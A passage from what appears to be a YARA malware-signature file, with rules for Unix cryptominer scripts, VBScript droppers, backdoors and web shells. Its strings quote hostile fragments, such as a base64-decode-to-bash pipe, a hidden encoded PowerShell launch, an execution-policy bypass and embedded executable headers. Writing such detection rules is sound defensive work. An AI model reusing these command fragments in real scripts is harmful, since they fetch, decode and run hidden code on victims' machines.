rule sh_malware_unix_cryptominer_025 : malware
{
    strings:
        $trigger = "export PATH=$PATH"
    condition:
        $trigger and PR07002 and PR06998
}

rule sh_malware_unix_cryptominer_033 : malware
{
    strings:
        $trigger = "/lib/systemd/systemd-init"
    condition:
        $trigger and PR06998 and PR06999
}

rule sh_malware_unix_cryptominer_034 : malware
{
    strings:
        $trigger = "~/.systemd-init"
    condition:
        $trigger and PR06998 and PR06999
}

rule sh_malware_unix_cryptominer_035 : malware
{
    strings:
        $trigger = "grep -q \"0.0.0.0 pastebin.com\" /etc/hosts"
    condition:
        $trigger and PR06998 and PR06999
}

rule sh_malware_unix_cryptominer_036 : malware
{
    strings:
        $trigger = "grep -q \"0.0.0.0 lsd.systemten.org\" /etc/hosts"
    condition:
        $trigger and PR06998 and PR06999
}

private rule PR07003 : trigger
{
    strings:
        $ps0 = "gKZmkK|base64 -d|bash"
    condition:
        $ps0
}

rule sh_malware_unix_cryptominer_037 : malware
{
    strings:
        $trigger = "export PATH=$PATH"
    condition:
        $trigger and PR07003 and PR06998
}

private rule PR07004 : trigger
{
    strings:
        $ps0 = "stratum+tcps"
    condition:
        $ps0
}

rule sh_malware_unix_cryptominer_038 : malware
{
    strings:
        $trigger = "tar.gz && tar xf"
    condition:
        $trigger and PR07004
}

private rule PR07005 : trigger
{
    strings:
        $ps0 = "new ActiveXObject(\"WScript.Shell\").Run(\"powershell -noP -sta -w 1 -enc  SQBmACgAJ"
    condition:
        $ps0
}

rule vb_backdoor_uploader_001 : backdoor
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR07005
}

private rule PR07006 : trigger
{
    strings:
        $ps0 = "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"
    condition:
        $ps0
}

rule vb_hacktool_reverse_tcp_001 : hacktool
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR07006
}

private rule PR07007 : trigger
{
    strings:
        $ps0 = "WriteData = \"4D5A900"
    condition:
        $ps0
}

rule vb_injected_WSHshelldropper_001 : injected
{
    strings:
        $trigger = "hell"
    condition:
        $trigger and PR07007
}

private rule PR07008 : trigger
{
    strings:
        $ps0 = "so\"&\"sos\"&\"pider,goo\"&\"g\"&\"lebot"
    condition:
        $ps0
}

rule vb_malware_generic_003 : malware
{
    strings:
        $trigger = "<%"
    condition:
        $trigger and PR07008
}

private rule PR07009 : trigger
{
    strings:
        $ps0 = "erver"
    condition:
        $ps0
}

rule vb_malware_generic_004 : malware
{
    strings:
        $trigger = "\"fucksure\")>0"
    condition:
        $trigger and PR07009
}

private rule PR07010 : trigger
{
    strings:
        $ps0 = "Array(\"%#\", chr("
    condition:
        $ps0
}

rule vbs_malware_dropper_001 : malware
{
    strings:
        $trigger = "ZW0uVGhyZWFkaW5nLlRocmVhZF06OkdldERvbWFpbigpLkxvYWQoJF8wKTskXzEuRW50cnlQb2ludC5pbnZva2UoJG51bGwsJG51bGwpOyIgJiBDaHJ3KDM0KSwwLGZhbHNlDQo="
    condition:
        $trigger and PR07010
}

rule vbs_malware_dropper_002 : malware
{
    strings:
        $trigger = "powershell.exe -ExecutionPolicy Bypass"
    condition:
        $trigger
}

private rule PR07011 : trigger
{
    strings:
        $ps0 = "4D5A90000300000004000000FFFF0000B800000000000000"
    condition:
        $ps0
}

rule vbs_malware_dropper_002_02 : malware
{
    strings:
        $trigger = "stri"
    condition:
        $trigger and PR07011
}

rule vbs_malware_dropper_002_03 : malware
{
    strings:
        $trigger = "77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184,0,0,0,0,"
    condition:
        $trigger and PR06414
}

private rule PR07012 : trigger
{
    strings:
        $ps0 = "Decompress(@(31,139,8,0,0,0,0,0,4,"
    condition:
        $ps0
}

rule vbs_malware_dropper_002_04 : malware
{
    strings:
        $trigger = "stri"
    condition:
        $trigger and PR07012
}

